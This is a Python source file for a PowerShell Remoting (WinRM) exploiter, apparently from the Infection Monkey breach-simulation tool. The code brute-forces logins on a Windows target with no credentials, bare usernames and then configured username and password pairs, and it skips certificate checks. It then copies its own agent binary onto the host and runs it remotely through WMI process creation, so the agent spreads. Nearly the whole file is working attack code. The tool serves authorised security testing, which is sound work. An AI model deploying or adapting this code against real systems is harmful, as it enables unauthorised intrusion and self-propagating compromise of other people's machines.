import logging
import os
import typing

import pypsrp
import spnego
from pypsrp.client import Client
from pypsrp.powershell import PowerShell, RunspacePool
from urllib3 import connectionpool

import infection_monkey.monkeyfs as monkeyfs
from common.utils.exceptions import FailedExploitationError
from common.utils.exploit_enum import ExploitType
from infection_monkey.exploit.HostExploiter import HostExploiter
from infection_monkey.exploit.tools.helpers import get_monkey_depth, get_target_monkey_by_os
from infection_monkey.exploit.web_rce import WIN_ARCH_32, WIN_ARCH_64
from infection_monkey.model import DROPPER_ARG, GET_ARCH_WINDOWS, RUN_MONKEY, VictimHost
from infection_monkey.utils.commands import build_monkey_commandline

LOG = logging.getLogger(__name__)

TEMP_MONKEY_BINARY_FILEPATH = "./monkey_temp_bin"


class PowerShellExploiter(HostExploiter):
    _TARGET_OS_TYPE = ["windows"]
    EXPLOIT_TYPE = ExploitType.BRUTE_FORCE
    _EXPLOITED_SERVICE = "PowerShell Remoting (WinRM)"

    def __init__(self, host: VictimHost):
        PowerShellExploiter._set_sensitive_packages_log_level_to_error()

        super().__init__(host)
        self.client = None

    @staticmethod
    def _set_sensitive_packages_log_level_to_error():
        # If root logger is inherited, extensive and potentially sensitive info could be logged
        sensitive_packages = [pypsrp, spnego, connectionpool]
        for package in sensitive_packages:
            logging.getLogger(package.__name__).setLevel(logging.ERROR)

    def _exploit_host(self):
        result = self._attempt_exploitations()
        if not result:
            return False

        arch = self._get_host_arch()
        self.is_32bit = arch == WIN_ARCH_32

        self._write_virtual_file_to_local_path()

        self.monkey_path_on_victim = (
            self._config.dropper_target_path_win_32
            if self.is_32bit
            else self._config.dropper_target_path_win_64
        )
        is_monkey_copy_successful = self._copy_monkey_binary_on_victim()

        if is_monkey_copy_successful:
            self._execute_monkey_on_victim()
        else:
            return False

        return True

    def _attempt_exploitations(self) -> bool:
        try:
            self.client = self._exploit_without_credentials()
        except FailedExploitationError:
            LOG.info("Failed exploitation without credentials.")
            try:
                self.client = self._exploit_with_usernames_only(
                    usernames=self._config.exploit_user_list
                )
            except FailedExploitationError:
                LOG.info("Failed exploitation using configured usernames only.")
                try:
                    self.client = self._exploit_with_credentials(
                        credential_list=self._config.get_exploit_user_password_pairs()
                    )
                except FailedExploitationError:
                    LOG.info("Failed exploitation using configured credentials. Quitting.")
                    return False

        return True

    def _exploit_without_credentials(self) -> Client:
        return self._try_exploit()

    def _exploit_with_usernames_only(self, usernames: typing.List[str]) -> Client:
        for username in usernames:
            try:
                client = self._try_exploit(username)
                return client
            except FailedExploitationError:
                pass
        raise FailedExploitationError

    def _exploit_with_credentials(
        self, credential_list: typing.List[typing.Tuple[str, str]]
    ) -> Client:
        for username, password in credential_list:
            try:
                client = self._try_exploit(username, password)
                return client
            except FailedExploitationError:
                pass
        raise FailedExploitationError

    def _try_exploit(
        self, username: typing.Optional[str] = None, password: typing.Optional[str] = None
    ) -> Client:
        try:
            with Client(
                self.host.ip_addr,
                username=username,
                password=password,
                cert_validation=False,
            ) as client:
                # attempt to execute dir command to know if authentication was successful
                client.execute_cmd("dir")
                return client
        except Exception:
            raise FailedExploitationError

    def _get_host_arch(self) -> typing.Union[WIN_ARCH_32, WIN_ARCH_64]:
        output = self._execute_cmd_on_host(GET_ARCH_WINDOWS)
        if "64-bit" in output:
            return WIN_ARCH_64
        else:
            return WIN_ARCH_32

    def _execute_cmd_on_host(self, cmd: str) -> str:
        output, _, _ = self.client.execute_cmd(cmd)
        return output

    def _write_virtual_file_to_local_path(self) -> None:
        monkey_fs_path = get_target_monkey_by_os(is_windows=True, is_32bit=self.is_32bit)

        with monkeyfs.open(monkey_fs_path) as monkey_virtual_file:
            with open(TEMP_MONKEY_BINARY_FILEPATH, "wb") as monkey_local_file:
                monkey_local_file.write(monkey_virtual_file.read())

    def _copy_monkey_binary_on_victim(self) -> bool:
        try:
            self.client.copy(TEMP_MONKEY_BINARY_FILEPATH, self.monkey_path_on_victim)
            return True
        except Exception:
            return False
        finally:
            os.remove(TEMP_MONKEY_BINARY_FILEPATH)

    def _execute_monkey_on_victim(self) -> None:
        monkey_params = build_monkey_commandline(
            target_host=self.host,
            depth=get_monkey_depth() - 1,
            vulnerable_port=None,
            location=self.monkey_path_on_victim,
        )

        monkey_execution_command = RUN_MONKEY % {
            "monkey_path": self.monkey_path_on_victim,
            "monkey_type": DROPPER_ARG,
            "parameters": monkey_params,
        }

        with self.client.wsman, RunspacePool(self.client.wsman) as pool:
            ps = PowerShell(pool)
            ps.add_cmdlet("Invoke-WmiMethod").add_parameter("path", "win32_process").add_parameter(
                "name", "create"
            ).add_parameter("ArgumentList", monkey_execution_command)
            ps.invoke()
